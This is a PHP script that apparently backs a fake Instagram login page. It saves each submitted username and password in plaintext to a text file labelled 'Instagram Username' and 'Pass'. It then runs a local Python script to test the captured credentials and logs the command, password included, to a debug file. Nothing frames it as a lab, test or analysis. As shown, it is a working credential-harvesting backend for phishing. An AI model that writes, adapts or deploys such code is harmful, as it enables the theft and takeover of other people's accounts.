<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

if (empty($username) || empty($password)) {

    echo json_encode([
        'success' => false,
        'message' => 'Username and password are required'
    ]);

    exit();
}

$python = trim(shell_exec('which python3'));

$currentDir = __DIR__;

$script = $currentDir . '/login.py';

$command =
    $python . ' ' .
    escapeshellarg($script) . ' ' .
    escapeshellarg($username) . ' ' .
    escapeshellarg($password) .
    ' 2>&1';

file_put_contents(
    'php_debug.txt',
    "COMMAND:\n" . $command . "\n\n",
    FILE_APPEND
);

$output = shell_exec($command);

file_put_contents(
    'php_debug.txt',
    "OUTPUT:\n" . $output . "\n\n",
    FILE_APPEND
);

$result = trim($output);

if (strpos($result, 'true') !== false) {

    echo json_encode([
        'success' => true,
        'message' => 'Login true',
        'output' => $output
    ]);

} else {

    echo json_encode([
        'success' => false,
        'message' => 'Login failed',
        'output' => $output
    ]);
}
?>


